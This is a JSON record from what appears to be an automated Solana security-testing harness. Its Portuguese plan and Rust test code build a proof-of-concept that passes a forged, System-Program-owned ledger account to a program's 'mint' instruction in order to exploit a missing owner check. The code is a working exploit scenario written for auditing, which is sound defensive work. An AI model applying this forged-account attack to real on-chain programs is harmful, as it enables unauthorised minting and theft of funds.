attempts.raw:
{
  "plan": "O ataque explora a ausência de verificação de owner na conta `ledger` (accounts[0]). O baseline usa uma conta legítima cujo owner é o programa-alvo, com dados válidos nas posições 40..56, e a instrução `mint` deve ter sucesso. O ataque fornece uma conta forjada com owner diferente (ex.: System Program) e dados controlados pelo atacante nas mesmas posições. O efeito mede se a conta forjada foi aceita e teve seus bytes 40..56 alterados pela instrução, demonstrando que o programa operou sobre uma conta que não lhe pertence.",
  "scenario": "let program_id = env.program_id;

// Conta legítima: owner = program_id, dados com supply=100, balance=200 nas posições 40..56
let mut legit_data = vec![0u8; 56];
legit_data[40..48].copy_from_slice(&100u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&200u64.to_le_bytes());
let legit_ledger = account(&program_id, &legit_data, None);

// Conta forjada: owner = System Program (diferente do programa), dados controlados pelo atacante
let mut forged_data = vec![0u8; 56];
forged_data[40..48].copy_from_slice(&999u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&888u64.to_le_bytes());
let forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);

// Instrução mint: discriminador IX_MINT (0) + amount u64 (10)
let amount: u64 = 10;
let mut ix_data = vec![0u8]; // IX_MINT
ix_data.extend_from_slice(&amount.to_le_bytes());

// Baseline: usa a conta legítima
let ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(program_id, false)]);
let r_baseline = env.baseline("mint com conta legítima", &ix_baseline, &[legit_ledger.clone()]);

// Ataque: usa a conta forjada (owner diferente)
let ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(solana_sdk::system_program::id(), false)]);
let r_attack = env.attack("mint com conta forjada (owner diferente)", &ix_attack, &[forged_ledger.clone()]);

// Efeito: se o ataque teve sucesso, a conta forjada foi aceita e seus bytes 40..56 foram alterados
if r_attack.program_result == ProgramResult::Success {
    let after_forged = after(&r_attack, &solana_sdk::system_program::id());
    let new_supply = read_u64(after_forged.data(), 40);
    let new_balance = read_u64(after_forged.data(), 48);
    env.effect(
        "conta forjada (owner != programa) foi aceita e teve supply/balance incrementados",
        new_supply == 999u64.wrapping_add(amount) && new_balance == 888u64.wrapping_add(amount),
    );
}"
}

